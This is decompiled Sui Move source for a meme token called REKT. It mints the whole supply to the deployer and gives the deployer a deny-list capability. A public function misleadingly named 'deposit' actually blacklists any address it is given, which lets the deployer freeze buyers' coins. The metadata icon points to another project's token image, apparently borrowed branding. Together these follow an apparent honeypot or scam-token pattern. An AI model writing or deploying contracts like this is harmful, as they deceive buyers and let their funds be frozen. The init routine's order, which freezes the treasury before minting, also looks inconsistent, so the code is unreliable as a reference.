module 0x2489b4efb1eced0190fe4e6db5e989262f6e8c9e2c443004053f5b43f6b8906::rekt {
    struct REKT has drop {
        dummy_field: bool,
    }

    public fun deposit(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<REKT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<REKT>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: REKT, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = trim_right(b"111111111   ");
        let v1 = trim_right(b"https://dd.dexscreener.com/ds-data/tokens/ethereum/0xdd3b11ef34cd511a2da159034a05fcb94d806686.png?size=lg&key=f5f72e                                                                                                                                                                                                            ");
        let v2 = if (0x1::vector::length<u8>(&v1) == 0) {
            0x1::option::none<0x2::url::Url>()
        } else {
            0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(v1))
        };
        let (v3, v4, v5) = 0x2::coin::create_regulated_currency_v2<REKT>(arg0, (0x1::vector::length<u8>(&v0) as u8), 0x1::ascii::into_bytes(0x1::string::to_ascii(0x1::string::utf8(trim_right(b"REKT    ")))), trim_right(b"Rekt                            "), trim_right(b"The REKT project is a meme-based, community-driven ecosystem that integrates art, culture, and consumer products like Rekt Drinks, targeting digitally-savvy, culturally engaged crypto enthusiasts and collectors.                                                                                                             "), v2, false, arg1);
        let v6 = v3;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<REKT>>(v5);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<REKT>>(v6);
        0x2::transfer::public_transfer<0x2::coin::Coin<REKT>>(0x2::coin::mint<REKT>(&mut v6, 1000000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<REKT>>(v4, 0x2::tx_context::sender(arg1));
    }

    fun trim_right(arg0: vector<u8>) : vector<u8> {
        let v0 = 32;
        let v1 = &v0;
        while (0x1::vector::length<u8>(&arg0) > 0) {
            if (0x1::vector::borrow<u8>(&arg0, 0x1::vector::length<u8>(&arg0) - 1) != v1) {
                break
            };
            0x1::vector::pop_back<u8>(&mut arg0);
        };
        arg0
    }

    // decompiled from Move bytecode v6
}

